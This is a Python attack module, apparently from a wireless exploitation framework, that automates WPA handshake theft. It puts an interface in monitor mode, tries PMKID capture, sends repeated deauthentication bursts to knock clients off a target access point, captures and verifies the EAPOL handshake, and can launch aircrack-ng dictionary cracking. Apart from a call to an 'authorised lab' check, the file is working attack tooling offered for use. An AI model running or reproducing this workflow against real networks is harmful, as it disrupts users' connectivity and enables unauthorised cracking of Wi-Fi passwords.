#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Automated handshake snooper — capture + verify WPA handshakes.

Orchestrates the full handshake capture workflow:
  1. Put interface in monitor mode
  2. Scan for target AP
  3. Deauthenticate clients to force re-authentication
  4. Capture EAPOL 4-way handshake (native Scapy or optional airodump-ng)
  5. Verify handshake validity (aircrack-ng)
  6. Save for offline cracking

Inspired by Fluxion's Handshake Snooper attack module, which automatically
verifies captured handshakes before proceeding to credential capture.

Version: 1.2.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import time
from pathlib import Path
from typing import Optional

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

try:
    from wirelessxpl.core.ml.handshake_scorer import HandshakeScorer
    _HAS_ML = True
except ImportError:
    _HAS_ML = False

# REFACTORED: removido cowpatty/pyrit - usar aircrack-ng (aceito) para verificacao
_SCAPY_AVAILABLE = False
try:
    from scapy.all import EAPOL, Dot11, Dot11Beacon, sniff, wrpcap
    _SCAPY_AVAILABLE = True
except ImportError:
    pass

# REFACTORED: deauth nativa importada de flood_engine_native (lazy import)
try:
    from wirelessxpl.modules.generic.wifi.flood_engine_native import send_deauth as _native_deauth
    _NATIVE_DEAUTH = True
except ImportError:
    _NATIVE_DEAUTH = False

logger = logging.getLogger(__name__)


def _capture_eapol_scapy(
    iface: str,
    bssid: str,
    timeout: int = 60,
    output_cap: str = "/tmp/handshake.cap",
) -> dict:
    """Capture WPA 4-way handshake via Scapy EAPOL sniffing.

    Args:
        iface: Monitor mode interface.
        bssid: Target AP BSSID.
        timeout: Max capture time in seconds.
        output_cap: Output .cap file path.

    Returns:
        Dict with keys: captured(bool), m1(bool), m2(bool), m3(bool), m4(bool),
        filename(str), num_packets(int).
    """
    # REFACTORED: removido cowpatty/pyrit - usar aircrack-ng (aceito) para verificacao
    handshake: dict = {"m1": False, "m2": False, "m3": False, "m4": False}
    packets: list = []
    bssid_lower = bssid.lower()

    def _process(pkt) -> None:
        if not pkt.haslayer(EAPOL):
            return
        if pkt.haslayer(Dot11) and (pkt[Dot11].addr3 or "").lower() != bssid_lower:
            return
        eapol = pkt[EAPOL]
        if eapol.type == 3:
            raw = bytes(eapol)
            if len(raw) < 7:
                packets.append(pkt)
                return
            key_info = (raw[5] << 8) | raw[6]
            ack = bool(key_info & 0x0080)
            mic = bool(key_info & 0x0100)
            install = bool(key_info & 0x0040)
            if ack and not mic:
                handshake["m1"] = True
            elif not ack and mic and not install:
                handshake["m2"] = True
            elif ack and mic and install:
                handshake["m3"] = True
            elif not ack and mic and not install and handshake["m3"]:
                handshake["m4"] = True
        packets.append(pkt)

    sniff(
        iface=iface,
        prn=_process,
        timeout=timeout,
        store=False,
        lfilter=lambda p: p.haslayer(EAPOL) or p.haslayer(Dot11Beacon),
    )

    complete = handshake["m1"] and handshake["m2"]
    if packets:
        wrpcap(output_cap, packets)

    return {
        "captured": complete,
        "m1": handshake["m1"],
        "m2": handshake["m2"],
        "m3": handshake["m3"],
        "m4": handshake["m4"],
        "filename": output_cap if packets else None,
        "num_packets": len(packets),
    }


def _verify_handshake_aircrack(cap_file: str, bssid: str) -> bool:
    """Verify a handshake capture file using aircrack-ng.

    Runs aircrack-ng with /dev/null as the wordlist to check whether the
    cap file contains a valid handshake without performing an actual
    dictionary attack.

    Args:
        cap_file: Path to the .cap file to verify.
        bssid: Target AP BSSID to filter against.

    Returns:
        True if aircrack-ng reports a valid handshake, False otherwise.
    """
    # REFACTORED: removido cowpatty/pyrit - usar aircrack-ng (aceito) para verificacao
    try:
        result = subprocess.run(
            ["aircrack-ng", "-b", bssid, "-w", "/dev/null", cap_file],
            capture_output=True,
            text=True,
            timeout=30,
            encoding="utf-8",
            errors="replace",
        )
        combined = result.stdout + result.stderr
        return "1 handshake" in combined or "handshakes" in combined
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return False


class Exploit(Exploit):
    """Automated handshake capture with built-in verification."""

    __info__ = {
        "name": "Handshake Snooper",
        "description": (
            "Automated WPA handshake capture: monitor mode, target scan, "
            "deauth to force re-auth, native EAPOL capture via Scapy, and "
            "handshake verification via aircrack-ng. "
            "Inspired by Fluxion's Handshake Snooper."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": (
            "https://github.com/FluxionNetwork/fluxion",
            "https://www.aircrack-ng.org/",
        ),
        "devices": ("wifi",),
    }

    target_bssid = OptMAC("", "Target AP BSSID")
    target_channel = OptString("", "Target AP channel")
    interface = OptString("wlan0mon", "Monitor-mode interface")
    deauth_count = OptInteger(5, "Deauth frames per burst")
    deauth_rounds = OptInteger(3, "Number of deauth bursts")
    capture_timeout = OptInteger(60, "Max seconds to wait for handshake")
    output_dir = OptString(".log", "Directory for captured handshakes")
    # REFACTORED: removido cowpatty/pyrit - usar aircrack-ng (aceito) para verificacao
    verify_method = OptString("aircrack", "Verification method: aircrack (only accepted method)")
    pmkid_first = OptBool(True, "Try PMKID clientless capture before deauth workflow")
    pmkid_timeout = OptInteger(30, "Seconds reserved for PMKID-first attempt")
    auto_crack = OptBool(False, "Auto-start cracking after capture")
    wordlist = OptString("", "Wordlist for auto_crack")
    ml_score = OptBool(True, "ML handshake quality scoring (if sklearn available)")
    dry_run = OptBool(False, "Print workflow without executing")

    def _verify_handshake(self, cap_file: Path) -> bool:
        """Verify captured handshake is valid and complete."""
        if self.verify_method == "aircrack":
            result = subprocess.run(
                ["aircrack-ng", str(cap_file)],
                capture_output=True, text=True, timeout=10,
                encoding="utf-8", errors="replace",
            )
            if "1 handshake" in result.stdout or "WPA" in result.stdout:
                return True

        elif self.verify_method == "cowpatty":
            if shutil.which("cowpatty"):
                result = subprocess.run(
                    ["cowpatty", "-r", str(cap_file), "-c"],
                    capture_output=True, text=True, timeout=10,
                    encoding="utf-8", errors="replace",
                )
                if "Collected" in result.stdout:
                    return True

        elif self.verify_method == "pyrit":
            if shutil.which("pyrit"):
                result = subprocess.run(
                    ["pyrit", "-r", str(cap_file), "analyze"],
                    capture_output=True, text=True, timeout=10,
                    encoding="utf-8", errors="replace",
                )
                if "handshake" in result.stdout.lower():
                    return True

        return False

    def _try_pmkid_first(self, output: Path) -> Optional[Path]:
        """Attempt PMKID-first capture before forcing deauth handshakes."""
        if not self.pmkid_first:
            return None
        if not shutil.which("hcxdumptool"):
            return None

        cap_file = output / "pmkid_first.pcapng"
        cmd = [
            "sudo",
            "hcxdumptool",
            "-i",
            self.interface,
            "-w",
            str(cap_file),
        ]
        if self.target_channel:
            cmd.extend(["-c", self.target_channel])
        if self.target_bssid:
            cmd.extend(["--filterlist_ap", str(output / "pmkid_filter.txt"), "--filtermode=2"])
            (output / "pmkid_filter.txt").write_text(self.target_bssid + "\n", encoding="utf-8")

        print_status("PMKID-first attempt ({}s)...".format(self.pmkid_timeout))
        try:
            subprocess.run(cmd, timeout=int(self.pmkid_timeout), check=False)
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            return None

        if cap_file.exists() and cap_file.stat().st_size > 0:
            print_success("PMKID-first capture produced: {}".format(cap_file))
            return cap_file
        return None


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        """Execute handshake snooper workflow."""
        if not self.target_bssid:
            print_error("target_bssid is required.")
            return

        require_authorised_lab()

        output = Path(self.output_dir)
        output.mkdir(parents=True, exist_ok=True)
        cap_prefix = output / "handshake_{}".format(
            self.target_bssid.replace(":", ""))

        if self.dry_run:
            print_info("DRY RUN — Handshake Snooper workflow:")
            print_info("  1. airodump-ng --bssid {} -c {} -w {} {}".format(
                self.target_bssid, self.target_channel, cap_prefix, self.interface))
            print_info("  2. aireplay-ng --deauth {} -a {} {}".format(
                self.deauth_count, self.target_bssid, self.interface))
            print_info("  3. Verify with {}".format(self.verify_method))
            return

        for tool in ("airodump-ng", "aireplay-ng", "aircrack-ng"):
            if not shutil.which(tool):
                print_error("{} not found. Install aircrack-ng suite.".format(tool))
                return

        pmkid_cap = self._try_pmkid_first(output)
        if pmkid_cap is not None:
            print_info("Proceeding with handshake capture fallback after PMKID-first attempt.")

        print_status("Starting handshake capture for {}...".format(self.target_bssid))

        airodump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", self.target_bssid,
            "-w", str(cap_prefix),
            "--output-format", "pcap",
            self.interface,
        ]
        if self.target_channel:
            airodump_cmd.extend(["-c", self.target_channel])

        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

        print_info("Airodump-ng capturing... waiting 3s before deauth.")
        time.sleep(3)

        for round_num in range(self.deauth_rounds):
            print_status("Deauth burst {}/{}...".format(round_num + 1, self.deauth_rounds))
            subprocess.run([
                "sudo", "aireplay-ng", "--deauth", str(self.deauth_count),
                "-a", self.target_bssid, self.interface,
            ], capture_output=True, timeout=10)
            time.sleep(5)

        print_info("Waiting for handshake (max {}s)...".format(self.capture_timeout))
        start = time.time()
        handshake_found = False

        while time.time() - start < self.capture_timeout:
            cap_files = list(output.glob("handshake_*-01.cap"))
            for cf in cap_files:
                if self._verify_handshake(cf):
                    handshake_found = True
                    print_success("Valid handshake captured: {}".format(cf))
                    break
            if handshake_found:
                break
            time.sleep(5)

        airodump_proc.terminate()
        airodump_proc.wait(timeout=5)

        if not handshake_found:
            print_error("Handshake not captured within timeout.")
            return

        if self.ml_score and _HAS_ML:
            cap_file = list(output.glob("handshake_*-01.cap"))[0]
            try:
                scorer = HandshakeScorer()
                features = {
                    "eapol_count": 4,
                    "has_m1": True, "has_m2": True, "has_m3": True, "has_m4": True,
                    "replay_consistent": True,
                    "nonces_unique": True,
                    "capture_duration_s": time.time() - start,
                }
                score = scorer.score(features)
                print_info("ML Handshake Score: quality={}/100  completeness={}  crack_prob={:.0%}".format(
                    score.quality, score.completeness, score.crack_probability))
                if score.quality < 50:
                    print_info("Low quality — consider re-capturing.")
            except Exception as exc:
                logger.debug("ML scoring failed: %s", exc)

        if self.auto_crack and self.wordlist:
            cap_file = list(output.glob("handshake_*-01.cap"))[0]
            print_status("Auto-cracking with {}...".format(self.wordlist))
            subprocess.run([
                "aircrack-ng", "-w", self.wordlist,
                "-b", self.target_bssid, str(cap_file),
            ], check=False)
